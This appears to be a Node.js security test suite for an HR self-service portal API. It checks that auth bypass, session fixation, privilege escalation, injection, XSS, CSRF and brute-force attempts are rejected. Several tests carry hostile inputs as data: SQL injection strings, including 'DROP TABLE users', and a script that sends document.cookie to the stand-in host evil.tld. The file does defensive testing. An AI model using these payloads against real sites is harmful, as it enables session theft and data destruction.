import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createTestHarness } from './helpers.js';

describe('Negative Security Tests (PDF Section 8 & Security Requirements)', () => {
  let harness;

  before(async () => {
    harness = await createTestHarness();
  });

  after(async () => {
    await harness.close();
  });

  it('1. Authentication Bypass & AC-02: Unauthenticated requests to every protected endpoint return 401', async () => {
    const anon = harness.createAgent();
    const endpoints = [
      ['GET', '/api/employees/me'],
      ['PATCH', '/api/employees/me/address'],
      ['GET', '/api/leaves/balance'],
      ['POST', '/api/leaves'],
      ['GET', '/api/leaves/my'],
      ['GET', '/api/leaves/team'],
      ['PATCH', '/api/leaves/55555555-5555-4555-8555-555555555503/decision'],
      ['GET', '/api/payslips'],
      ['GET', '/api/payslips/66666666-6666-4666-8666-666610000005/download'],
      ['GET', '/api/hr/employees'],
      ['GET', '/api/admin/users']
    ];

    for (const [method, path] of endpoints) {
      const res = await anon[method.toLowerCase()](path, { body: method !== 'GET' ? {} : undefined });
      assert.equal(res.status, 401, `Expected 401 for unauthenticated ${method} ${path}`);
      assert.ok(res.body.error.correlationId);
    }

    // Forged/random 64-char cookie token is rejected with 401
    anon.setCookie('ess_session=' + 'f'.repeat(64));
    const forgedRes = await anon.get('/api/employees/me');
    assert.equal(forgedRes.status, 401);
  });

  it('2. Weak Password Rejection & User Enumeration Protection: Rejects <12 char passwords and returns identical generic error for unknown users', async () => {
    const agent = harness.createAgent();

    // Weak password (<12 chars) rejected on login
    const weakLogin = await agent.post('/api/auth/login', {
      body: { email: 'aayush.shrestha@portal.demo', password: 'short' }
    });
    assert.equal(weakLogin.status, 400);
    assert.ok(weakLogin.body.error.fieldErrors.password);

    // Unknown user vs wrong password for valid user return identical 401 message & code
    const unknownUserRes = await agent.post('/api/auth/login', {
      body: { email: 'nonexistent.person@portal.demo', password: 'WrongPassword#2026!' }
    });
    const wrongPassRes = await agent.post('/api/auth/login', {
      body: { email: 'aayush.shrestha@portal.demo', password: 'WrongPassword#2026!' }
    });
    assert.equal(unknownUserRes.status, 401);
    assert.equal(wrongPassRes.status, 401);
    assert.equal(unknownUserRes.body.error.code, wrongPassRes.body.error.code);
    assert.equal(unknownUserRes.body.error.message, wrongPassRes.body.error.message);
  });

  it('3. Session Fixation, Idle Timeout Expiry & Logout Revocation: Replaying token after logout or expiry returns 401', async () => {
    const agent = harness.createAgent();
    // Pre-set an attacker-chosen cookie before login to test session fixation resistance
    const fixedCookie = 'ess_session=' + 'a'.repeat(64);
    agent.setCookie(fixedCookie);

    const loginRes = await agent.post('/api/auth/login', {
      body: { email: 'ashmita.poudel@portal.demo', password: 'EmployeePass#2026!' }
    });
    assert.equal(loginRes.status, 200);
    const issuedCookie = agent.getCookie();
    assert.notEqual(issuedCookie, fixedCookie, 'Server must issue a fresh session token on login');

    // Logout revokes session in DB
    const logoutRes = await agent.post('/api/auth/logout');
    assert.equal(logoutRes.status, 200);

    // Replay the captured cookie after logout -> must be 401
    agent.setCookie(issuedCookie);
    const replayRes = await agent.get('/api/employees/me');
    assert.equal(replayRes.status, 401);

    // Test idle timeout expiration
    const login2 = await agent.post('/api/auth/login', {
      body: { email: 'ashmita.poudel@portal.demo', password: 'EmployeePass#2026!' }
    });
    assert.equal(login2.status, 200);
    // Force session idle_expires_at into the past in the DB
    const activeSession = harness.repo.tables.sessions.find(
      (s) => s.user_id === '11111111-1111-4111-8111-111111111106' && !s.revoked_at
    );
    activeSession.idle_expires_at = new Date(Date.now() - 60_000).toISOString();

    const expiredRes = await agent.get('/api/employees/me');
    assert.equal(expiredRes.status, 401);
  });

  it('4. BOLA (Broken Object-Level Authorization / Horizontal Escalation): Employee cannot download another employee payslip or cancel another employee leave (AC-02)', async () => {
    const aayushAgent = harness.createAgent();
    await aayushAgent.post('/api/auth/login', {
      body: { email: 'aayush.shrestha@portal.demo', password: 'EmployeePass#2026!' }
    });

    // Payslip 66666666-6666-4666-8666-666610000006 belongs to Ashmita Poudel (EMP-1006)
    const otherPayslipRes = await aayushAgent.get(
      '/api/payslips/66666666-6666-4666-8666-666610000006/download'
    );
    assert.equal(otherPayslipRes.status, 403);

    // Leave request 55555555-5555-4555-8555-555555555503 belongs to Ashmita Poudel (EMP-1006)
    const otherLeaveCancelRes = await aayushAgent.post(
      '/api/leaves/55555555-5555-4555-8555-555555555503/cancel',
      { body: { version: 1 } }
    );
    assert.equal(otherLeaveCancelRes.status, 403);
  });

  it('5. BFLA (Broken Function-Level Authorization / Vertical Escalation): Employee cannot call Manager, HR, or System Admin endpoints; System Admin cannot access payslips or leave data', async () => {
    const empAgent = harness.createAgent();
    await empAgent.post('/api/auth/login', {
      body: { email: 'dipesh.adhikari@portal.demo', password: 'EmployeePass#2026!' }
    });

    const mgrListAttempt = await empAgent.get('/api/leaves/team');
    assert.equal(mgrListAttempt.status, 403);

    const mgrDecideAttempt = await empAgent.patch(
      '/api/leaves/55555555-5555-4555-8555-555555555503/decision',
      { body: { decision: 'APPROVED', comment: 'Self approve attempt' } }
    );
    assert.equal(mgrDecideAttempt.status, 403);

    const hrAttempt = await empAgent.get('/api/hr/employees');
    assert.equal(hrAttempt.status, 403);

    const adminAttempt = await empAgent.get('/api/admin/users');
    assert.equal(adminAttempt.status, 403);

    // System Admin separation of duties: cannot access payslips or leave balances/requests
    const sysAgent = harness.createAgent();
    await sysAgent.post('/api/auth/login', {
      body: { email: 'sysadmin@portal.demo', password: 'AdminPortal#2026!' }
    });
    const sysPayslipAttempt = await sysAgent.get('/api/payslips');
    assert.equal(sysPayslipAttempt.status, 403);

    const sysLeaveAttempt = await sysAgent.get('/api/leaves/balance');
    assert.equal(sysLeaveAttempt.status, 403);
  });

  it('6. Manager Relationship Violation (AC-04): Manager cannot decide a leave request belonging to a non-direct-report employee', async () => {
    // Suman Karki (EMP-1003) manages EMP-1005..1007.
    // Leave request 55555555-5555-4555-8555-555555555505 belongs to Niraj Bhandari (EMP-1009), who reports to Pratima Gurung (EMP-1004).
    const sumanAgent = harness.createAgent();
    await sumanAgent.post('/api/auth/login', {
      body: { email: 'suman.karki@portal.demo', password: 'ManagerOne#2026!' }
    });

    const crossTeamDecision = await sumanAgent.patch(
      '/api/leaves/55555555-5555-4555-8555-555555555505/decision',
      { body: { decision: 'APPROVED', comment: 'Trying to approve another manager report' } }
    );
    assert.equal(crossTeamDecision.status, 403);
  });

  it('7. SQL/NoSQL Injection via sort, filter, and path parameters is rejected with 400', async () => {
    const agent = harness.createAgent();
    await agent.post('/api/auth/login', {
      body: { email: 'aayush.shrestha@portal.demo', password: 'EmployeePass#2026!' }
    });

    const sqliSort = await agent.get(
      '/api/leaves/my?sortBy=' + encodeURIComponent('created_at; DROP TABLE users;--')
    );
    assert.equal(sqliSort.status, 400);

    const sqliFilter = await agent.get(
      '/api/leaves/my?status=' + encodeURIComponent("PENDING' OR '1'='1")
    );
    assert.equal(sqliFilter.status, 400);

    const sqliParam = await agent.get(
      '/api/payslips/' + encodeURIComponent("1' OR '1'='1") + '/download'
    );
    assert.equal(sqliParam.status, 400);
  });

  it('8. Stored & Reflected XSS Prevention: Rejects HTML/script payloads in address and leave reason fields and sets strict CSP', async () => {
    const agent = harness.createAgent();
    await agent.post('/api/auth/login', {
      body: { email: 'kriti.maharjan@portal.demo', password: 'EmployeePass#2026!' }
    });

    // Check CSP header
    const meRes = await agent.get('/api/employees/me');
    assert.match(meRes.headers.get('content-security-policy'), /default-src 'self'/);
    assert.equal(meRes.headers.get('x-content-type-options'), 'nosniff');

    // Attempt stored XSS in address update
    const xssAddress = await agent.patch('/api/employees/me/address', {
      body: {
        version: 1,
        residential_line1: '<script>fetch("https://evil.tld?c="+document.cookie)</script>',
        residential_city: 'Lalitpur',
        residential_state: 'Bagmati',
        residential_postal_code: '44700',
        residential_country: 'NP',
        mailing_same_as_residential: true
      }
    });
    assert.equal(xssAddress.status, 400);
    assert.ok(xssAddress.body.error.fieldErrors.residential_line1);

    // Attempt stored XSS in leave request reason
    const xssLeave = await agent.post('/api/leaves', {
      body: {
        leave_type_id: '44444444-4444-4444-8444-444444444401',
        start_date: '2026-12-20',
        end_date: '2026-12-21',
        reason: '<img src=x onerror=alert(1)>'
      }
    });
    assert.equal(xssLeave.status, 400);
    assert.ok(xssLeave.body.error.fieldErrors.reason);
  });

  it('9. CSRF Protection: State-changing requests without X-CSRF-Token or with wrong token are rejected with 403', async () => {
    const agent = harness.createAgent();
    await agent.post('/api/auth/login', {
      body: { email: 'kriti.maharjan@portal.demo', password: 'EmployeePass#2026!' }
    });

    // Missing CSRF header
    const noCsrfRes = await agent.patch('/api/employees/me/address', {
      includeCsrf: false,
      body: {
        version: 1,
        residential_line1: 'House 55, Patan',
        residential_city: 'Lalitpur',
        residential_state: 'Bagmati',
        residential_postal_code: '44700',
        residential_country: 'NP',
        mailing_same_as_residential: true
      }
    });
    assert.equal(noCsrfRes.status, 403);
    assert.equal(noCsrfRes.body.error.code, 'CSRF_INVALID');

    // Wrong CSRF token
    const badCsrfRes = await agent.patch('/api/employees/me/address', {
      headers: { 'X-CSRF-Token': '0'.repeat(64) },
      body: {
        version: 1,
        residential_line1: 'House 55, Patan',
        residential_city: 'Lalitpur',
        residential_state: 'Bagmati',
        residential_postal_code: '44700',
        residential_country: 'NP',
        mailing_same_as_residential: true
      }
    });
    assert.equal(badCsrfRes.status, 403);
    assert.equal(badCsrfRes.body.error.code, 'CSRF_INVALID');
  });

  it('10. Sensitive Data Exposure Prevention: Rejects tokens in URL query strings, hides stack traces, and never exposes password/session hashes', async () => {
    const agent = harness.createAgent();
    await agent.post('/api/auth/login', {
      body: { email: 'kriti.maharjan@portal.demo', password: 'EmployeePass#2026!' }
    });

    // Sensitive query param rejected
    const urlTokenAttempt = await agent.get('/api/employees/me?token=secret123');
    assert.equal(urlTokenAttempt.status, 400);
    assert.equal(urlTokenAttempt.body.error.code, 'SENSITIVE_QUERY_PARAM');

    // Malformed JSON body returns clean error with correlationId and no stack trace
    const malformedRes = await agent.post('/api/leaves', {
      body: '{"bad_json": '
    });
    assert.equal(malformedRes.status, 400);
    assert.equal(malformedRes.body.error.code, 'INVALID_JSON');
    assert.equal('stack' in malformedRes.body.error, false);
  });

  it('11. Race Conditions & Duplicate Submissions: Concurrent leave approvals or duplicate idempotency keys allow only one to succeed', async () => {
    const empAgent = harness.createAgent();
    await empAgent.post('/api/auth/login', {
      body: { email: 'sabina.tamang@portal.demo', password: 'EmployeePass#2026!' }
    });

    // Submit two concurrent leave requests with the same idempotency_key
    const payload = {
      leave_type_id: '44444444-4444-4444-8444-444444444401',
      start_date: '2026-11-02',
      end_date: '2026-11-04',
      reason: 'Concurrent submission race test',
      idempotency_key: 'race-key-999'
    };
    const [r1, r2] = await Promise.all([
      empAgent.post('/api/leaves', { body: payload }),
      empAgent.post('/api/leaves', { body: payload })
    ]);
    const statuses = [r1.status, r2.status].sort();
    assert.deepEqual(statuses, [201, 409], 'Exactly one concurrent submission should succeed (201) and the duplicate should return 409');

    const createdLeave = r1.status === 201 ? r1.body.data.leaveRequest : r2.body.data.leaveRequest;

    // Concurrent manager decisions on the same pending leave request
    const mgrAgent = harness.createAgent();
    await mgrAgent.post('/api/auth/login', {
      body: { email: 'pratima.gurung@portal.demo', password: 'ManagerTwo#2026!' }
    });

    const [d1, d2] = await Promise.all([
      mgrAgent.patch(`/api/leaves/${createdLeave.id}/decision`, {
        body: { decision: 'APPROVED', comment: 'First concurrent approval', version: 1 }
      }),
      mgrAgent.patch(`/api/leaves/${createdLeave.id}/decision`, {
        body: { decision: 'APPROVED', comment: 'Second concurrent approval', version: 1 }
      })
    ]);
    const decisionStatuses = [d1.status, d2.status].sort();
    assert.deepEqual(decisionStatuses, [200, 409], 'Exactly one concurrent decision should succeed (200) and the second should fail with 409');

    // Verify used_days was deducted only once (3 days, not 6)
    const balCheck = await empAgent.get('/api/leaves/balance');
    const annualBal = balCheck.body.data.balances.find((b) => b.leave_type_code === 'ANNUAL');
    assert.equal(annualBal.used_days, 3);
  });

  it('12. Abuse Protection: Enforces account lockout after repeated failed logins and IP rate limiting (429)', async () => {
    harness.app.resetRateLimiters();
    const agent = harness.createAgent();

    // Repeated failed logins on niraj.bhandari@portal.demo trigger account lockout (threshold = 4 in test config)
    for (let i = 0; i < 4; i++) {
      const failRes = await agent.post('/api/auth/login', {
        body: { email: 'niraj.bhandari@portal.demo', password: 'WrongPassword#2026!' }
      });
      assert.equal(failRes.status, 401);
    }

    // Even with the CORRECT password now, login is rejected while account is locked
    const lockedAttempt = await agent.post('/api/auth/login', {
      body: { email: 'niraj.bhandari@portal.demo', password: 'EmployeePass#2026!' }
    });
    assert.equal(lockedAttempt.status, 401);

    // Exceed IP rate limit (max = 25 in test config) -> returns 429 Too Many Requests
    let saw429 = false;
    for (let i = 0; i < 25; i++) {
      const res = await agent.post('/api/auth/login', {
        body: { email: 'random.attempt@portal.demo', password: 'WrongPassword#2026!' }
      });
      if (res.status === 429) {
        saw429 = true;
        break;
      }
    }
    assert.equal(saw429, true, 'Expected 429 Too Many Requests when login rate limit is exceeded');
  });
});
